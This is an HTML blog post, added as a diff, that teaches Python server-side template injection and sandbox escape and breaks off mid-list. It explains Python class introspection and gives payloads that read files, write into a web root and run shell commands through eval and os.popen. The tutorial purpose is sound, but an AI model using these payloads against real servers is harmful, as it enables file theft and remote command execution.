@@ -1,0 +1,1476 @@
+<!DOCTYPE html>
+
+
+
+  
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon-32x32-next.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="模板注入,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="LJH's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="这是我对Python服务端模板注入与沙盒逃逸的学习小结与实践">
+<meta name="keywords" content="模板注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python服务端模板注入与沙盒逃逸的学习小结与实践">
+<meta property="og:url" content="https://museljh.github.io/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/index.html">
+<meta property="og:site_name" content="LJH&#39;s blog">
+<meta property="og:description" content="这是我对Python服务端模板注入与沙盒逃逸的学习小结与实践">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/TLY4Hqu.png">
+<meta property="og:image" content="https://i.imgur.com/BjatiKo.png">
+<meta property="og:image" content="https://i.imgur.com/k9Lh8bu.png">
+<meta property="og:image" content="https://i.imgur.com/TLY4Hqu.png">
+<meta property="og:image" content="https://i.imgur.com/1FJQMEp.png">
+<meta property="og:image" content="https://i.imgur.com/BjatiKo.png">
+<meta property="og:updated_time" content="2019-03-19T16:49:21.214Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python服务端模板注入与沙盒逃逸的学习小结与实践">
+<meta name="twitter:description" content="这是我对Python服务端模板注入与沙盒逃逸的学习小结与实践">
+<meta name="twitter:image" content="https://i.imgur.com/TLY4Hqu.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://museljh.github.io/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/">
+
+
+
+
+
+  <title>Python服务端模板注入与沙盒逃逸的学习小结与实践 | LJH's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+<a href="https://github.com/MuseLJH" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+  <div class=" page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LJH's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">LJH's blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://museljh.github.io/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LJH">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LJH's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Python服务端模板注入与沙盒逃逸的学习小结与实践</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-20T00:47:46+08:00">
+                2019-03-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/文章/" itemprop="url" rel="index">
+                    <span itemprop="name">文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/" class="leancloud_visitors" data-flag-title="Python服务端模板注入与沙盒逃逸的学习小结与实践">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  21
+                </span>
+              
+            </div>
+          
+
+          
+              <div class="post-description">
+                  这是我对Python服务端模板注入与沙盒逃逸的学习小结与实践
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。</p>
+<p>正常而言，出于安全考虑，模板引擎基本上都是拥有沙盒、命名空间的，代码的解析执行都是发生在有限的沙盒里面，因此，沙盒逃逸也成为 SSTI 不可或缺的存在。</p>
+<p>这里其实主要讲关于沙盒逃逸的，因为模板注入的话，我自己看哪些模板引擎的源码也不是非常懂里面到底写什么，很难比较深入的阐述，因为一般来说沙盒逃逸经常伴随着模板注入所以这里模板注入还是提一提，总的来说这篇其实是对沙盒逃逸常见payload的讲解。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务端模板注入"><a href="#服务端模板注入" class="headerlink" title="服务端模板注入"></a>服务端模板注入</h3><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。服务端模板注入，顾名思义，就是通过在服务端的模板文件或模板字符串中注入特定的恶意代码导致产生代码执行的一种漏洞攻击方式。<br>不同的模板引擎，根据不同的解析方式相应的也是存在不同的利用方法。</p>
+<h3 id="服务端模板注入漏洞探测"><a href="#服务端模板注入漏洞探测" class="headerlink" title="服务端模板注入漏洞探测"></a>服务端模板注入漏洞探测</h3><p>详细来自</p>
+<blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></p>
+</blockquote>
+<p>漏洞一般出现在这两种情况下，而每种有不同的探测手法：<br>文本类<br>大部分的模板语言支持我们输入 HTML，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smarty=Hello &#123;user.name&#125;</span><br><span class="line">Hello user1</span><br><span class="line"> </span><br><span class="line">freemarker=Hello $&#123;username&#125;</span><br><span class="line">Hello newuser</span><br><span class="line"> </span><br><span class="line">any=&lt;b&gt;Hello&lt;/b&gt;</span><br><span class="line">&lt;b&gt;Hello&lt;b&gt;</span><br></pre></td></tr></table></figure>
+<p>代码类<br>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p>
+<blockquote>
+<p>personal_greeting=username<br>Hello user01</p>
+</blockquote>
+<p>我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">personal_greeting=username&lt;tag&gt;</span><br><span class="line">Hello</span><br><span class="line">personal_greeting=username&#125;&#125;&lt;tag&gt;</span><br><span class="line">Hello user01 &lt;tag&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="为什么模板注入可以使用沙盒绕过"><a href="#为什么模板注入可以使用沙盒绕过" class="headerlink" title="为什么模板注入可以使用沙盒绕过"></a>为什么模板注入可以使用沙盒绕过</h2><p>模板支持对应语言的“编程功能”以及一些简单的运算<br>模板并不是静态的放进去，虽然模板产品类型很多，但或多或少都能执行一些逻辑</p>
+<blockquote>
+<p>name=20   name=4</p>
+</blockquote>
+<p>而在python的Jinja2模板中，就能支持更多更强大的逻辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from jinja2 import Template</span><br><span class="line">str = &quot;&#123;% for i in [1,2,3] %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;&quot;</span><br><span class="line">template = Template(&apos;your input: &#123;&#125;&apos;.format(str))</span><br><span class="line">print (template.render())</span><br></pre></td></tr></table></figure></p>
+<p>其实我个人理解，就是在一些模板引擎中会有注册一些自己使用模块，没有注册的模块是不能使用的，所以沙盒逃逸其实就是一种被限制情况下的python终端</p>
+<h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><h4 id="SSTI-in-Tornado"><a href="#SSTI-in-Tornado" class="headerlink" title="SSTI in Tornado"></a>SSTI in Tornado</h4><p>护网杯 2018 WEB (1) easy_tornado<br>详解 &gt;<a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4</a></p>
+<h3 id="沙盒技术"><a href="#沙盒技术" class="headerlink" title="沙盒技术"></a>沙盒技术</h3><p>实际上，沙盒就是一种类似影子系统的虚拟系统环境，它比带有宿主的虚拟机有着更深层次的系统内核级技术。它可以接管恶意软件的功能调用接口或函数行为，并且在确认了病毒行为之后实行回滚机制，并让系统保持一种干净的状态。详细可以看<a href="https://www.anquanke.com/post/id/85672" target="_blank" rel="noopener">这里</a></p>
+<h3 id="python沙盒逃逸概述"><a href="#python沙盒逃逸概述" class="headerlink" title="python沙盒逃逸概述"></a>python沙盒逃逸概述</h3><p>沙箱逃逸,可以认为是从一个被限制的python环境绕过种种过滤和限制最周拿到更高权限甚至getshell，这是我们的最终的目的，但是实现这个目标之前我们必须解决的就是如何绕过重重的waf去使用python执行命令</p>
+<p>这是我在K0rz3n师傅博客里看到的一段攻防可以很形象的描述，可以推荐先看看，<a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">传送门</a></p>
+<p>沙盒逃逸就是要在这样一种受到到限制的情况下，不断绕过限制最终达成getshell等目的</p>
+<p>想要深入了解沙盒逃逸，python魔法方法肯定是要知道的，不然很容易知其然不知其所以然，一旦题目有了一定变化就容易不知所措。<br>1.魔法方法简介<br>我觉得想要较为深入了解python沙盒逃逸的内容必须先了解下python魔法方法，关于这些魔术方法在下面需要的时候我会讲解。</p>
+<h3 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h3><h4 id="常见-payload1"><a href="#常见-payload1" class="headerlink" title="常见 payload1"></a>常见 payload1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()</span><br><span class="line"></span><br><span class="line">#写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;)</span><br><span class="line"></span><br><span class="line">#执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )</span><br></pre></td></tr></table></figure>
+<h4 id="1-1-xxx"><a href="#1-1-xxx" class="headerlink" title="1.1.().xxx"></a>1.1.<code>().xxx</code></h4><p>在一些沙盒逃逸的pyload中经常会出现’ ‘.xxx.xxx.xx或者是().xxx.xxx.xxx,[].xxx.xxx.xx<br>如果不是比较了解python的话理解起来其实是比较困难的<br>我现在来讲解下<br>首先type下‘ ’，和() ,[]<br><img src="https://i.imgur.com/TLY4Hqu.png" alt=""></p>
+<blockquote>
+<p>tuple是一种有序列表叫元组，和list非常类似，但是tuple一旦初始化就不能修改</p>
+</blockquote>
+<h4 id="1-2-class"><a href="#1-2-class" class="headerlink" title="1.2. ().__class__"></a>1.2. <code>().__class__</code></h4><p>().__class__是什么意思呢？当然想要明白这个问题首先我们得先知道下typle与__class__的差别</p>
+<ul>
+<li>type()<br>type 这个类实例化了一切，包括 object 和 他自己<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(1)</span><br><span class="line">&lt;class &apos;int&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(int)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(type)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(object)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>结论：<br>type-&gt;class-&gt;obj<br>2.object<br>object 是最顶层的基类，所有的类都继承了Object，包括type<br><img src="https://i.imgur.com/BjatiKo.png" alt=""><br>但是 object 是由 type 实例化的</p>
+<p>示例代码：<br><img src="https://i.imgur.com/k9Lh8bu.png" alt=""></p>
+<ul>
+<li>__class__</li>
+</ul>
+<p>__class__与type()极为接近，但是有一定差别</p>
+<p>(1)我们可以从一个对象实例到他的类<br>‘ ‘.__class__<br><img src="https://i.imgur.com/TLY4Hqu.png" alt=""></p>
+<p><img src="https://i.imgur.com/1FJQMEp.png" alt=""></p>
+<p>仅仅从上面两个例子确实是很难看出type与__class__之间的区别，不过我们这里姑且暂时简单将其理解为是type（）<br>想要具体了解的可以看这里</p>
+<blockquote>
+<p><a href="http://brionas.github.io/2014/09/15/python-type-class/" target="_blank" rel="noopener">http://brionas.github.io/2014/09/15/python-type-class/</a></p>
+</blockquote>
+<h4 id="1-3-class-bases-0"><a href="#1-3-class-bases-0" class="headerlink" title="1.3. ().__class__.__bases__[0]"></a>1.3. <code>().__class__.__bases__[0]</code></h4><p>元组，包含 类型对象(type, class) C 的全部基类，类型的实例通常没有属性 __bases__。概念其实是比较难理解的我们直接举例子</p>
+<p><img src="https://i.imgur.com/BjatiKo.png" alt=""></p>
+<p>这里我们可以看到通过__base__我们得到了object对象<br>那么这里又出现了个问题 __base__ 与__bases__有什么区别呢？</p>
+<ul>
+<li><code>__bases[0]__base__</code></li>
+</ul>
+<p>我们定义了两个类，M继承了C。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt;&gt;&gt; class C(object): pass</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; &gt;&gt;&gt; class M(C,type): pass</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; &gt;&gt;&gt; M.__bases__[0]</span><br><span class="line">&gt; &lt;class &apos;__main__.C&apos;&gt;</span><br><span class="line">&gt; &gt;&gt;&gt; M.__base__</span><br><span class="line">&gt; &lt;type &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以看到M.__base__是自己定义的type而 M.__bases__确是C<br>再举个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class A(object): pass</span><br><span class="line">class B(dict): pass</span><br><span class="line">class C(A, B): pass</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> C.__base__</span><br><span class="line">&lt;class &apos;__main__.B&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>为什么呢？因为B定义了C的基类所以<code>C.__base__</code>是B</p>
+<blockquote>
+<p>这里要先知道的是一般情况下，python中一个子类只能有一个基类</p>
+</blockquote>
+<p>继续看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A(object): pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class B(A,type): pass</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; B.__bases__</span><br><span class="line">(&lt;class &apos;__main__.A&apos;&gt;, &lt;type &apos;type&apos;&gt;)</span><br></pre></td></tr></table></figure>
+<p>可以看出<code>B.__bases__</code>的结果是一个元祖，并且自上而下直到B自己的基类。<br>那么<code>__bases__[0]与__base__区别是什么呢？应该有很多人可以直接得出答案了吧？</code><br>同样是上面那个例子，两者区别可以一眼看出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; B.__bases__[0]</span><br><span class="line">&lt;class &apos;__main__.A&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; B.__base__</span><br><span class="line">&lt;type &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>再试试多继承,之前的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A(object): pass</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class B(dict): pass</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class C(A, B): pass</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; C.__base__</span><br><span class="line">&lt;class &apos;__main__.B&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; C.__bases__</span><br><span class="line">(&lt;class &apos;__main__.A&apos;&gt;, &lt;class &apos;__main__.B&apos;&gt;)</span><br></pre></td></tr></table></figure>
+<h4 id="1-4-class-bases-0-subclasses-40"><a href="#1-4-class-bases-0-subclasses-40" class="headerlink" title="1.4.().__class__.__bases__[0].()__subclasses__[40]"></a>1.4.<code>().__class__.__bases__[0].()__subclasses__[40]</code></h4><ul>
+<li><code>__subclasses__()</code><br>每个类都保留一个对其直接子类的弱引用列表<br>举两个例子<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int.__subclasses__()</span><br><span class="line">[&lt;type &apos;bool&apos;&gt;]</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Foo(object):</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class Bar(Foo):</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; print Foo.__subclasses__()</span><br><span class="line">[&lt;class &apos;__main__.Bar&apos;&gt;]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>那么<code>__subclasses__()</code>其实的作用就是返回object的所有弱子类方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure></p>
+<p>对于右边的[40]相信在看完3后应该都会比较了解了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, 